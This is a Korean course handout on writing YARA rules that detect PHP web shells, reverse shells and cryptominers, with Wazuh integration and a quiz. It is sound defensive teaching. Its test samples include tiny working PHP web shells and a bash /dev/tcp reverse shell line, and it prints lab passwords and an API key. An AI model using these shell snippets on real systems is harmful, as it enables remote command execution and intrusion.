# Week 04: YARA 룰 작성

## 학습 목표
- YARA 룰의 구조(meta, strings, condition)를 이해하고 작성할 수 있다
- 문자열, 헥스, 정규표현식 패턴으로 악성코드 시그니처를 정의할 수 있다
- 웹셸, 백도어, 암호화폐 채굴기를 탐지하는 실전 YARA 룰을 작성할 수 있다
- YARA 룰을 Wazuh와 연동하여 파일 무결성 모니터링(FIM)에 활용할 수 있다
- 오탐을 줄이기 위한 조건 최적화와 성능 고려사항을 이해한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:50 | YARA 기본 구조 + 문법 (Part 1) | 강의 |
| 0:50-1:30 | 고급 패턴 + 조건 (Part 2) | 강의/토론 |
| 1:30-1:40 | 휴식 | - |
| 1:40-2:30 | YARA 룰 작성 실습 (Part 3) | 실습 |
| 2:30-3:10 | Wazuh 연동 + 자동화 (Part 4) | 실습 |
| 3:10-3:20 | 복습 퀴즈 + 과제 안내 | 정리 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **YARA** | YARA | "Yet Another Recursive Acronym" - 파일 패턴 매칭 도구 | 지문 감식 도구 |
| **시그니처** | Signature | 악성코드를 식별하는 고유 패턴 | 범인의 지문 |
| **strings** | Strings Section | YARA 룰에서 검색할 문자열/패턴 정의 | 수배서의 인상착의 |
| **condition** | Condition Section | strings 매칭 조건 논리 조합 | 체포 조건 |
| **meta** | Metadata Section | 룰 부가 정보 (작성자, 설명 등) | 수배서 머리글 |
| **hex string** | Hexadecimal String | 16진수 바이트 패턴 | 바이너리 지문 |
| **wildcard** | Wildcard | 임의 바이트 매칭 (??) | 인상착의의 "대략 170cm" |
| **jump** | Jump | 가변 길이 건너뛰기 [n-m] | "3~5칸 건너뜀" |
| **웹셸** | Web Shell | 웹 서버에 심는 원격 제어 백도어 | 건물에 숨긴 비밀 출입구 |
| **FIM** | File Integrity Monitoring | 파일 무결성 모니터링 | 서류 위변조 감시 |

---

# Part 1: YARA 기본 구조 + 문법 (50분)

## 1.1 YARA란?

YARA는 **파일이나 메모리에서 특정 패턴을 찾아 악성코드를 식별**하는 도구다. 보안 연구자 Victor Alvarez가 개발했으며, 안티바이러스 시그니처와 유사하지만 훨씬 유연하다.

### YARA의 활용 영역

```
+---[악성코드 분류]---+   +---[위협 헌팅]---+   +---[IR/포렌식]---+
| - 패밀리 분류        |   | - 파일 스캔     |   | - 디스크 스캔    |
| - 변종 탐지          |   | - 메모리 스캔   |   | - 메모리 분석    |
| - 캠페인 추적        |   | - 네트워크 트래픽|   | - 증거 분류      |
+---------------------+   +-----------------+   +------------------+

+---[SOC 운영]---+        +---[자동화]---+
| - FIM 연동     |        | - CI/CD 스캔  |
| - 업로드 검사  |        | - SOAR 연동   |
| - 격리 판단    |        | - 공유 저장소  |
+-----------------+        +---------------+
```

## 1.2 YARA 룰 기본 구조

```
rule RuleName
{
    meta:                    // 메타데이터 (선택)
        author = "analyst"
        description = "설명"
        date = "2026-04-04"
        
    strings:                 // 검색 패턴 (선택이지만 대부분 사용)
        $s1 = "pattern1"
        $s2 = { 4D 5A 90 }
        $s3 = /regex_pattern/
        
    condition:               // 매칭 조건 (필수)
        any of them
}
```

### meta 섹션 주요 필드

| 필드 | 설명 | 예시 |
|------|------|------|
| `author` | 작성자 | `"SOC Team"` |
| `description` | 룰 설명 | `"PHP 웹셸 탐지"` |
| `date` | 작성일 | `"2026-04-04"` |
| `reference` | 참고 URL | `"https://..."` |
| `hash` | 알려진 샘플 해시 | `"abc123..."` |
| `severity` | 심각도 | `"critical"` |
| `mitre_attack` | ATT&CK ID | `"T1505.003"` |

### strings 유형

```
[텍스트 문자열]
$text = "malware"              // 정확한 문자열
$text_nocase = "MaLwArE" nocase  // 대소문자 무시
$text_wide = "malware" wide    // UTF-16 인코딩
$text_ascii = "malware" ascii  // ASCII 인코딩
$text_full = "malware" ascii wide nocase  // 모두 적용

[헥스 문자열]
$hex = { 4D 5A 90 00 }        // MZ 헤더
$hex_wild = { 4D 5A ?? 00 }   // ?? = 임의 1바이트
$hex_jump = { 4D 5A [2-4] 00 } // [2-4] = 2~4바이트 건너뜀
$hex_alt = { ( 4D 5A | 50 4B ) } // 택일 (MZ 또는 PK)

[정규표현식]
$regex = /https?:\/\/[a-z0-9\-\.]+\.(tk|ml|ga|cf)/i
$regex2 = /eval\s*\(\s*\$_(GET|POST|REQUEST)/
```

## 1.3 condition 문법

### 기본 조건

```
condition: $s1                    // $s1이 존재하면 매칭
condition: $s1 and $s2            // 둘 다 존재
condition: $s1 or $s2             // 하나 이상 존재
condition: not $s1                // $s1이 없으면 매칭
condition: any of them            // 모든 문자열 중 하나라도
condition: all of them            // 모든 문자열 전부
condition: 2 of them              // 최소 2개 매칭
condition: 3 of ($s*)             // $s로 시작하는 것 중 3개
```

### 고급 조건

```
condition: #s1 > 5                // $s1이 5번 이상 출현
condition: @s1 < 100              // $s1의 오프셋이 100 미만
condition: $s1 at 0               // $s1이 파일 시작점에
condition: $s1 in (0..1024)       // $s1이 처음 1KB 내에
condition: filesize < 10KB        // 파일 크기 10KB 미만
condition: filesize > 1MB         // 파일 크기 1MB 초과
condition: uint16(0) == 0x5A4D   // 오프셋 0에서 2바이트 = MZ
condition: uint32be(0) == 0x7F454C46  // ELF 헤더
```

### 파일 형식 판별

```
// PE 파일 (Windows 실행파일)
condition: uint16(0) == 0x5A4D

// ELF 파일 (Linux 실행파일)
condition: uint32(0) == 0x464C457F

// PDF 파일
condition: uint32(0) == 0x46445025

// ZIP 파일
condition: uint16(0) == 0x4B50

// Shebang (스크립트)
condition: uint16(0) == 0x2123    // #!
```

## 1.4 YARA 설치 및 기본 사용

```bash
# YARA 설치 확인 (opsclaw 서버)
yara --version 2>/dev/null || echo "YARA 미설치"

# 설치 (필요시)
sudo apt-get update && sudo apt-get install -y yara 2>/dev/null

# 간단한 테스트
cat << 'RULE' > /tmp/test.yar
rule TestRule
{
    meta:
        description = "Simple test rule"
    strings:
        $test = "hello world"
    condition:
        $test
}
RULE

echo "hello world this is a test file" > /tmp/testfile.txt
yara /tmp/test.yar /tmp/testfile.txt
echo "Exit code: $? (0=매칭, 1=미매칭)"
```

> **명령어 해설**:
> - `yara <rules_file> <target>`: YARA 룰로 대상 파일/디렉토리 스캔
> - 매칭되면 룰 이름과 파일 경로가 출력된다
>
> **트러블슈팅**:
> - "yara: command not found" → `sudo apt-get install yara`
> - "error: syntax error" → YARA 룰 문법 확인 (중괄호, 따옴표)

---

# Part 2: 고급 패턴 + 조건 (40분)

## 2.1 웹셸 탐지 패턴

### PHP 웹셸 특징

```
[일반적인 PHP 웹셸 패턴]

1. 코드 실행 함수:
   eval(), system(), exec(), passthru(), shell_exec()
   popen(), proc_open(), pcntl_exec()

2. 입력 변수 사용:
   $_GET, $_POST, $_REQUEST, $_COOKIE, $_SERVER

3. 인코딩/난독화:
   base64_decode(), gzinflate(), str_rot13()
   preg_replace('/e', ...) (PHP <7)
   assert() (동적 코드 실행)

4. 파일 조작:
   file_put_contents(), fwrite(), move_uploaded_file()
   
5. 네트워크:
   fsockopen(), curl_exec(), file_get_contents('http')
```

### JSP/ASP 웹셸 패턴

```
[JSP 웹셸]
Runtime.getRuntime().exec()
ProcessBuilder
request.getParameter()

[ASP 웹셸]
Server.CreateObject("WScript.Shell")
Execute(), Eval()
Request.Form, Request.QueryString
```

## 2.2 악성코드 공통 패턴

### 리버스 셸

```
[리버스 셸 패턴]

Bash:     /dev/tcp/<IP>/<PORT>
Python:   socket.socket() + connect() + subprocess
Perl:     IO::Socket::INET + exec("/bin/sh")
PHP:      fsockopen() + exec() + /bin/sh
Netcat:   nc -e /bin/sh
```

### 암호화폐 채굴기

```
[채굴기 패턴]

- stratum+tcp://
- pool.minexmr.com
- xmrig, ccminer
- "cryptonight"
- mining_pool, pool_address
- wallet_address, payment_id
```

## 2.3 모듈 활용

```
// PE 모듈 (Windows 실행파일 분석)
import "pe"
rule SuspiciousPE {
    condition:
        pe.number_of_sections > 7 and
        pe.timestamp < 1000000000
}

// ELF 모듈 (Linux 실행파일 분석)
import "elf"
rule SuspiciousELF {
    condition:
        elf.type == elf.ET_EXEC and
        elf.number_of_sections < 3
}

// Hash 모듈
import "hash"
rule KnownMalware {
    condition:
        hash.md5(0, filesize) == "known_hash_value"
}

// Math 모듈 (엔트로피 계산)
import "math"
rule HighEntropy {
    condition:
        math.entropy(0, filesize) > 7.5  // 암호화/패킹 의심
}
```

---

# Part 3: YARA 룰 작성 실습 (50분)

## 3.1 PHP 웹셸 탐지 룰

> **실습 목적**: 실전에서 가장 많이 사용하는 PHP 웹셸 탐지 YARA 룰을 작성한다.
>
> **배우는 것**: 다중 패턴 조합, nocase 수정자, 조건 최적화
>
> **실전 활용**: 웹서버 파일 업로드 디렉토리 모니터링, 침해사고 조사 시 웹셸 찾기

```bash
# PHP 웹셸 탐지 YARA 룰 작성
mkdir -p /tmp/yara_rules

cat << 'RULE' > /tmp/yara_rules/php_webshell.yar
rule PHP_Webshell_Generic
{
    meta:
        author = "SOC Advanced Lab"
        description = "Generic PHP web shell detection"
        date = "2026-04-04"
        severity = "critical"
        mitre_attack = "T1505.003"
        reference = "https://attack.mitre.org/techniques/T1505/003/"

    strings:
        // 코드 실행 함수 + 사용자 입력
        $exec1 = "eval(" nocase
        $exec2 = "system(" nocase
        $exec3 = "exec(" nocase
        $exec4 = "passthru(" nocase
        $exec5 = "shell_exec(" nocase
        $exec6 = "popen(" nocase
        $exec7 = "proc_open(" nocase
        $exec8 = "pcntl_exec(" nocase
        $exec9 = "assert(" nocase

        // 사용자 입력 변수
        $input1 = "$_GET" nocase
        $input2 = "$_POST" nocase
        $input3 = "$_REQUEST" nocase
        $input4 = "$_COOKIE" nocase
        $input5 = "$_FILES" nocase

        // 인코딩/난독화
        $obf1 = "base64_decode(" nocase
        $obf2 = "gzinflate(" nocase
        $obf3 = "gzuncompress(" nocase
        $obf4 = "str_rot13(" nocase
        $obf5 = "rawurldecode(" nocase
        $obf6 = /chr\s*\(\s*\d+\s*\)\s*\./

        // 파일 조작
        $file1 = "file_put_contents(" nocase
        $file2 = "fwrite(" nocase
        $file3 = "move_uploaded_file(" nocase

        // 알려진 웹셸 문자열
        $known1 = "c99shell" nocase
        $known2 = "r57shell" nocase
        $known3 = "WSO " nocase
        $known4 = "b374k" nocase
        $known5 = "FilesMan" nocase
        $known6 = "China Chopper" nocase

    condition:
        // PHP 파일 (<?php 또는 <?)로 시작
        (uint32(0) == 0x68703F3C or uint16(0) == 0x3F3C) and
        (
            // 코드 실행 + 사용자 입력 조합
            (1 of ($exec*) and 1 of ($input*)) or
            // 코드 실행 + 난독화
            (1 of ($exec*) and 1 of ($obf*)) or
            // 알려진 웹셸
            any of ($known*) or
            // 난독화 + 파일 조작 + 사용자 입력
            (1 of ($obf*) and 1 of ($file*) and 1 of ($input*)) or
            // 3개 이상의 실행 함수 사용 (과도한 기능)
            3 of ($exec*)
        )
}
RULE

echo "=== PHP 웹셸 탐지 룰 작성 완료 ==="
cat /tmp/yara_rules/php_webshell.yar
```

## 3.2 테스트 샘플로 검증

```bash
# 테스트용 웹셸 샘플 생성 (실제 동작하지 않는 더미)
mkdir -p /tmp/yara_test

# 양성 샘플 1: 간단한 웹셸 패턴
cat << 'SAMPLE' > /tmp/yara_test/sample1.php
<?php
// 테스트 웹셸 패턴 (교육용 - 실제 동작하지 않음)
$cmd = $_GET['cmd'];
system($cmd);
?>
SAMPLE

# 양성 샘플 2: 난독화된 웹셸
cat << 'SAMPLE' > /tmp/yara_test/sample2.php
<?php
$x = base64_decode($_POST['data']);
eval($x);
?>
SAMPLE

# 양성 샘플 3: 알려진 웹셸 이름
cat << 'SAMPLE' > /tmp/yara_test/sample3.php
<?php
// c99shell variant
echo "c99shell v3.0";
?>
SAMPLE

# 음성 샘플: 정상 PHP 파일
cat << 'SAMPLE' > /tmp/yara_test/normal.php
<?php
echo "Hello World";
$name = htmlspecialchars($_GET['name']);
echo "Welcome, " . $name;
?>
SAMPLE

# YARA 스캔 실행
echo "=== YARA 스캔 결과 ==="
yara -s /tmp/yara_rules/php_webshell.yar /tmp/yara_test/ 2>/dev/null

echo ""
echo "=== 개별 파일 스캔 ==="
for f in /tmp/yara_test/*.php; do
    result=$(yara /tmp/yara_rules/php_webshell.yar "$f" 2>/dev/null)
    if [ -n "$result" ]; then
        echo "[DETECTED] $f → $result"
    else
        echo "[CLEAN]    $f"
    fi
done

# 정리
rm -rf /tmp/yara_test
```

> **결과 해석**: sample1, sample2, sample3은 탐지되고, normal.php는 탐지되지 않아야 한다. normal.php가 탐지되면 조건이 너무 느슨한 것이고, sample 중 하나라도 놓치면 패턴이 부족한 것이다.

## 3.3 리버스 셸 탐지 룰

```bash
cat << 'RULE' > /tmp/yara_rules/reverse_shell.yar
rule Linux_ReverseShell_Script
{
    meta:
        author = "SOC Advanced Lab"
        description = "Detects common reverse shell patterns in scripts"
        date = "2026-04-04"
        severity = "critical"
        mitre_attack = "T1059.004"

    strings:
        // Bash 리버스 셸
        $bash1 = "/dev/tcp/" ascii
        $bash2 = "bash -i >& /dev/tcp" ascii
        $bash3 = "bash -c 'bash -i" ascii

        // Python 리버스 셸
        $py1 = "socket.socket" ascii
        $py2 = ".connect((" ascii
        $py3 = "subprocess.call" ascii
        $py4 = "pty.spawn" ascii

        // Perl 리버스 셸
        $perl1 = "IO::Socket::INET" ascii
        $perl2 = "exec(\"/bin/" ascii

        // Netcat 리버스 셸
        $nc1 = "nc -e /bin/" ascii
        $nc2 = "ncat -e /bin/" ascii
        $nc3 = /nc\s+-[a-z]*e\s+\/bin\// ascii

        // PHP 리버스 셸
        $php1 = "fsockopen(" ascii
        $php2 = "php -r" ascii

        // 공통 패턴
        $common1 = "/bin/sh" ascii
        $common2 = "/bin/bash" ascii
        $common3 = "0>&1" ascii
        $common4 = "2>&1" ascii

    condition:
        (1 of ($bash*)) or
        ($py1 and $py2 and ($py3 or $py4)) or
        ($perl1 and $perl2) or
        (1 of ($nc*)) or
        ($php1 and 1 of ($common*)) or
        (
            filesize < 5KB and
            2 of ($common*) and
            1 of ($bash*, $py*, $perl*, $nc*, $php*)
        )
}
RULE

echo "=== 리버스 셸 탐지 룰 작성 완료 ==="

# 테스트
echo '#!/bin/bash' > /tmp/test_revshell.sh
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /tmp/test_revshell.sh

yara /tmp/yara_rules/reverse_shell.yar /tmp/test_revshell.sh 2>/dev/null
rm -f /tmp/test_revshell.sh
```

## 3.4 암호화폐 채굴기 탐지 룰

```bash
cat << 'RULE' > /tmp/yara_rules/cryptominer.yar
rule Cryptominer_Generic
{
    meta:
        author = "SOC Advanced Lab"
        description = "Detects cryptocurrency mining indicators"
        date = "2026-04-04"
        severity = "high"
        mitre_attack = "T1496"

    strings:
        // 마이닝 프로토콜
        $pool1 = "stratum+tcp://" ascii nocase
        $pool2 = "stratum+ssl://" ascii nocase
        $pool3 = "stratum2+tcp://" ascii nocase

        // 알려진 마이닝 풀
        $known_pool1 = "pool.minexmr.com" ascii nocase
        $known_pool2 = "xmrpool.eu" ascii nocase
        $known_pool3 = "nanopool.org" ascii nocase
        $known_pool4 = "pool.supportxmr.com" ascii nocase
        $known_pool5 = "hashvault.pro" ascii nocase

        // 마이너 이름
        $miner1 = "xmrig" ascii nocase
        $miner2 = "ccminer" ascii nocase
        $miner3 = "cpuminer" ascii nocase
        $miner4 = "minerd" ascii nocase
        $miner5 = "cgminer" ascii nocase

        // 알고리즘
        $algo1 = "cryptonight" ascii nocase
        $algo2 = "randomx" ascii nocase
        $algo3 = "ethash" ascii nocase
        $algo4 = "kawpow" ascii nocase

        // 설정 키워드
        $config1 = "mining_pool" ascii nocase
        $config2 = "pool_address" ascii nocase
        $config3 = "wallet_address" ascii nocase
        $config4 = "payment_id" ascii nocase
        $config5 = "\"algo\"" ascii
        $config6 = "\"pool\"" ascii
        $config7 = "donate-level" ascii nocase

    condition:
        any of ($pool*) or
        any of ($known_pool*) or
        (1 of ($miner*) and 1 of ($algo*)) or
        (1 of ($miner*) and 2 of ($config*)) or
        (1 of ($pool*) and 1 of ($config*)) or
        3 of ($config*)
}
RULE

echo "=== 암호화폐 채굴기 탐지 룰 작성 완료 ==="

# 테스트
echo '{"algo":"randomx","pool":"stratum+tcp://pool.minexmr.com:4444","wallet_address":"abc123"}' > /tmp/test_miner.json
yara /tmp/yara_rules/cryptominer.yar /tmp/test_miner.json 2>/dev/null
rm -f /tmp/test_miner.json
```

## 3.5 디렉토리 스캔

```bash
# web 서버의 웹 루트 디렉토리를 YARA로 스캔
echo "=== 웹서버 파일 스캔 ==="

# 먼저 룰 파일을 siem으로 복사
scp -o StrictHostKeyChecking=no /tmp/yara_rules/*.yar \
  siem@10.20.30.100:/tmp/ 2>/dev/null

# web 서버 스캔 (OpsClaw 경유)
export OPSCLAW_API_KEY="opsclaw-api-key-2026"

PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "yara-web-scan",
    "request_text": "웹서버 YARA 스캔 수행",
    "master_mode": "external"
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY"
curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY"

curl -s -X POST "http://localhost:8000/projects/$PROJECT_ID/dispatch" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "which yara && yara --version || echo YARA_NOT_INSTALLED",
    "subagent_url": "http://10.20.30.80:8002"
  }'
```

> **실전 활용**: 침해사고 조사 시 YARA를 웹 루트 디렉토리에 대해 실행하여 웹셸을 신속하게 찾을 수 있다. OpsClaw를 통해 여러 서버를 동시에 스캔할 수 있다.

---

# Part 4: Wazuh 연동 + 자동화 (40분)

## 4.1 Wazuh FIM + YARA 연동

```bash
# Wazuh의 Active Response로 YARA 스캔 연동
sshpass -p1 ssh siem@10.20.30.100 << 'REMOTE'

# YARA 설치 확인
which yara || sudo apt-get install -y yara 2>/dev/null

# YARA 룰 디렉토리 생성
sudo mkdir -p /var/ossec/etc/yara/rules
sudo mkdir -p /var/ossec/etc/yara/malware

# 웹셸 탐지 룰 복사
sudo tee /var/ossec/etc/yara/rules/webshell.yar << 'YARA'
rule PHP_Webshell_Simple
{
    meta:
        author = "SOC Lab"
        description = "Simple PHP webshell detection for Wazuh integration"
    strings:
        $exec1 = "eval(" nocase
        $exec2 = "system(" nocase
        $exec3 = "exec(" nocase
        $exec4 = "shell_exec(" nocase
        $input1 = "$_GET" nocase
        $input2 = "$_POST" nocase
        $input3 = "$_REQUEST" nocase
    condition:
        1 of ($exec*) and 1 of ($input*)
}
YARA

echo "YARA 룰 배포 완료"

# YARA Active Response 스크립트 생성
sudo tee /var/ossec/active-response/bin/yara_scan.sh << 'SCRIPT'
#!/bin/bash
# Wazuh Active Response - YARA 스캔
# FIM이 파일 변경을 탐지하면 해당 파일을 YARA로 스캔

LOCAL=$(dirname $0)
YARA_RULES="/var/ossec/etc/yara/rules/"
YARA_MALWARE="/var/ossec/etc/yara/malware/"
LOG_FILE="/var/ossec/logs/yara_scan.log"

read INPUT_JSON
FILENAME=$(echo $INPUT_JSON | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(data.get('parameters', {}).get('alert', {}).get('syscheck', {}).get('path', ''))
except:
    print('')
")

if [ -z "$FILENAME" ] || [ ! -f "$FILENAME" ]; then
    exit 0
fi

# YARA 스캔 실행
RESULT=$(yara -s "$YARA_RULES" "$FILENAME" 2>/dev/null)

if [ -n "$RESULT" ]; then
    echo "$(date) YARA MATCH: $FILENAME - $RESULT" >> "$LOG_FILE"
    # 악성 파일 격리
    QUARANTINE="$YARA_MALWARE/$(date +%Y%m%d_%H%M%S)_$(basename $FILENAME)"
    cp "$FILENAME" "$QUARANTINE" 2>/dev/null
    echo "$(date) QUARANTINED: $FILENAME -> $QUARANTINE" >> "$LOG_FILE"
fi
SCRIPT

sudo chmod 750 /var/ossec/active-response/bin/yara_scan.sh
sudo chown root:wazuh /var/ossec/active-response/bin/yara_scan.sh

echo "YARA Active Response 스크립트 배포 완료"

REMOTE
```

> **배우는 것**: Wazuh의 FIM(파일 무결성 모니터링)이 파일 변경을 탐지하면, Active Response로 YARA 스캔을 자동 실행하는 연동 방법
>
> **결과 해석**: FIM → 파일 변경 탐지 → YARA 스캔 → 매칭 시 격리 + 로그 기록. 이 파이프라인이 자동으로 동작한다.

## 4.2 Wazuh ossec.conf 설정

```bash
sshpass -p1 ssh siem@10.20.30.100 << 'REMOTE'

# Wazuh FIM 설정 확인 (웹 디렉토리 모니터링)
echo "=== 현재 FIM 설정 ==="
sudo grep -A5 "syscheck" /var/ossec/etc/ossec.conf 2>/dev/null | head -30

echo ""
echo "=== Active Response 설정 확인 ==="
sudo grep -A10 "active-response" /var/ossec/etc/ossec.conf 2>/dev/null | head -20

# YARA 스캔 로그 확인
echo ""
echo "=== YARA 스캔 로그 ==="
cat /var/ossec/logs/yara_scan.log 2>/dev/null || echo "(스캔 이력 없음)"

REMOTE
```

## 4.3 YARA 룰 성능 최적화

```bash
cat << 'SCRIPT' > /tmp/yara_performance.py
#!/usr/bin/env python3
"""YARA 룰 성능 가이드"""

tips = [
    {
        "title": "1. filesize 조건 먼저 검사",
        "good": 'condition: filesize < 1MB and $s1',
        "bad": 'condition: $s1 and filesize < 1MB',
        "reason": "filesize는 I/O 없이 검사 가능하므로 먼저 평가"
    },
    {
        "title": "2. 매직 바이트 조건 추가",
        "good": 'condition: uint16(0) == 0x3F3C and $webshell',
        "bad": 'condition: $webshell',
        "reason": "파일 형식을 먼저 필터링하면 불필요한 문자열 검색 감소"
    },
    {
        "title": "3. 짧은 문자열 피하기",
        "good": '$s1 = "eval($_GET" nocase',
        "bad": '$s1 = "ev" nocase',
        "reason": "짧은 문자열은 매칭 빈도가 높아 성능 저하"
    },
    {
        "title": "4. 정규표현식 최소화",
        "good": '$s1 = "eval(" nocase',
        "bad": '$s1 = /eval\\s*\\(/i',
        "reason": "정규표현식은 고정 문자열보다 10-100배 느림"
    },
    {
        "title": "5. 모듈은 필요할 때만",
        "good": '// PE 분석 불필요 시 import 생략',
        "bad": 'import "pe"  // 사용하지 않는데 import',
        "reason": "모듈 로드 자체가 오버헤드"
    },
]

print("=" * 60)
print("  YARA 룰 성능 최적화 가이드")
print("=" * 60)

for tip in tips:
    print(f"\n{tip['title']}")
    print(f"  GOOD: {tip['good']}")
    print(f"  BAD:  {tip['bad']}")
    print(f"  이유: {tip['reason']}")
SCRIPT

python3 /tmp/yara_performance.py
```

## 4.4 YARA 룰 테스트 자동화

```bash
cat << 'SCRIPT' > /tmp/yara_test_suite.sh
#!/bin/bash
# YARA 룰 테스트 자동화 스크립트
echo "========================================="
echo "  YARA 룰 테스트 스위트"
echo "========================================="

RULES_DIR="/tmp/yara_rules"
PASS=0
FAIL=0
TOTAL=0

run_test() {
    local desc="$1"
    local rule="$2"
    local file="$3"
    local expect="$4"  # "match" or "clean"
    
    TOTAL=$((TOTAL+1))
    result=$(yara "$rule" "$file" 2>/dev/null)
    
    if [ "$expect" = "match" ] && [ -n "$result" ]; then
        echo "  [PASS] $desc"
        PASS=$((PASS+1))
    elif [ "$expect" = "clean" ] && [ -z "$result" ]; then
        echo "  [PASS] $desc"
        PASS=$((PASS+1))
    else
        echo "  [FAIL] $desc (expected: $expect, got: $([ -n \"$result\" ] && echo match || echo clean))"
        FAIL=$((FAIL+1))
    fi
}

# 테스트 샘플 생성
mkdir -p /tmp/yara_test_samples

echo '<?php eval($_GET["cmd"]); ?>' > /tmp/yara_test_samples/webshell1.php
echo '<?php system($_POST["c"]); ?>' > /tmp/yara_test_samples/webshell2.php
echo '<?php $x=base64_decode($_REQUEST["d"]); eval($x); ?>' > /tmp/yara_test_samples/webshell3.php
echo '<?php echo "Hello World"; ?>' > /tmp/yara_test_samples/normal.php
echo 'Hello this is a text file' > /tmp/yara_test_samples/text.txt

echo ""
echo "--- PHP 웹셸 탐지 테스트 ---"
run_test "웹셸 eval+GET"    "$RULES_DIR/php_webshell.yar" /tmp/yara_test_samples/webshell1.php "match"
run_test "웹셸 system+POST" "$RULES_DIR/php_webshell.yar" /tmp/yara_test_samples/webshell2.php "match"
run_test "웹셸 난독화"      "$RULES_DIR/php_webshell.yar" /tmp/yara_test_samples/webshell3.php "match"
run_test "정상 PHP"          "$RULES_DIR/php_webshell.yar" /tmp/yara_test_samples/normal.php   "clean"
run_test "텍스트 파일"       "$RULES_DIR/php_webshell.yar" /tmp/yara_test_samples/text.txt     "clean"

# 정리
rm -rf /tmp/yara_test_samples

echo ""
echo "========================================="
echo "  결과: $PASS/$TOTAL 통과, $FAIL 실패"
echo "========================================="
SCRIPT

bash /tmp/yara_test_suite.sh
```

> **실전 활용**: YARA 룰을 작성한 후 반드시 양성/음성 테스트 세트로 검증해야 한다. CI/CD 파이프라인에 이 테스트를 포함하면 룰 변경 시 자동 검증이 가능하다.

---

## 체크리스트

- [ ] YARA 룰의 meta, strings, condition 3개 섹션을 설명할 수 있다
- [ ] 텍스트, 헥스, 정규표현식 3가지 문자열 유형을 사용할 수 있다
- [ ] nocase, wide, ascii 수정자의 용도를 알고 있다
- [ ] filesize, uint16, at, in 등 고급 조건을 활용할 수 있다
- [ ] PHP 웹셸의 일반적 패턴 5가지를 나열할 수 있다
- [ ] 리버스 셸 스크립트를 탐지하는 YARA 룰을 작성할 수 있다
- [ ] YARA를 Wazuh FIM/Active Response와 연동할 수 있다
- [ ] YARA 룰 성능 최적화 원칙을 알고 있다
- [ ] 테스트 샘플로 YARA 룰의 정확도를 검증할 수 있다
- [ ] yara CLI 명령으로 파일/디렉토리를 스캔할 수 있다

---

## 복습 퀴즈

**Q1.** YARA 룰의 3개 섹션과 각각의 역할을 설명하시오.

<details><summary>정답</summary>
1) meta: 룰의 메타데이터(작성자, 설명, 참고 등). 매칭에 영향 없음.
2) strings: 검색할 패턴 정의(텍스트, 헥스, 정규표현식).
3) condition: strings 매칭 결과를 논리적으로 조합하여 최종 판정.
</details>

**Q2.** `$s1 = "malware" nocase wide ascii`의 의미는?

<details><summary>정답</summary>
"malware" 문자열을 대소문자 구분 없이(nocase), UTF-16 인코딩(wide)과 ASCII 인코딩(ascii) 모두에서 검색한다. 즉 "MALWARE", "Malware" 등의 변형과 유니코드 인코딩 버전도 매칭한다.
</details>

**Q3.** 헥스 문자열 `{ 4D 5A ?? 00 [2-4] FF }`에서 ??와 [2-4]의 의미는?

<details><summary>정답</summary>
`??`는 임의의 1바이트(와일드카드). `[2-4]`는 2~4바이트를 건너뛴다는 의미(jump). 즉 "4D 5A (임의 1바이트) 00 (2~4바이트 건너뛰기) FF" 패턴을 찾는다.
</details>

**Q4.** `condition: 2 of ($exec*) and 1 of ($input*)`의 의미는?

<details><summary>정답</summary>
$exec 접두사가 붙은 문자열 중 2개 이상이 매칭되고, 동시에 $input 접두사가 붙은 문자열 중 1개 이상이 매칭되어야 전체 조건이 참이 된다.
</details>

**Q5.** PHP 웹셸을 탐지할 때 가장 신뢰도 높은 패턴 조합은?

<details><summary>정답</summary>
코드 실행 함수(eval, system, exec 등) + 사용자 입력 변수($_GET, $_POST, $_REQUEST)의 조합이다. 실행 함수만으로는 정상 코드에서도 사용되므로 오탐이 많고, 사용자 입력과 결합되어야 웹셸 확률이 높다.
</details>

**Q6.** `condition: uint16(0) == 0x5A4D`는 어떤 파일을 감지하는가?

<details><summary>정답</summary>
Windows PE(Portable Executable) 파일을 감지한다. 0x5A4D는 ASCII로 "MZ"이며, Windows 실행파일(.exe, .dll)의 매직 바이트다.
</details>

**Q7.** YARA 성능 최적화에서 왜 filesize 조건을 먼저 두는 것이 좋은가?

<details><summary>정답</summary>
filesize는 파일 시스템 메타데이터만으로 판단 가능하여 I/O 비용이 거의 없다. 먼저 평가하여 조건에 맞지 않는 파일을 빠르게 걸러내면 이후의 비용이 큰 문자열 검색을 건너뛸 수 있다.
</details>

**Q8.** Wazuh FIM과 YARA를 연동하는 이유는?

<details><summary>정답</summary>
FIM이 파일 변경을 탐지하면 YARA로 해당 파일만 정밀 스캔하여, 전체 디스크 스캔 없이 효율적으로 악성 파일을 탐지할 수 있다. 실시간 탐지와 자동 격리가 가능해진다.
</details>

**Q9.** YARA 룰에서 정규표현식이 고정 문자열보다 느린 이유는?

<details><summary>정답</summary>
고정 문자열은 Boyer-Moore 등의 빠른 알고리즘으로 검색하지만, 정규표현식은 NFA/DFA 상태 기계를 구동해야 하므로 10-100배 느리다. 특히 백트래킹이 많은 패턴은 극심한 성능 저하를 유발한다.
</details>

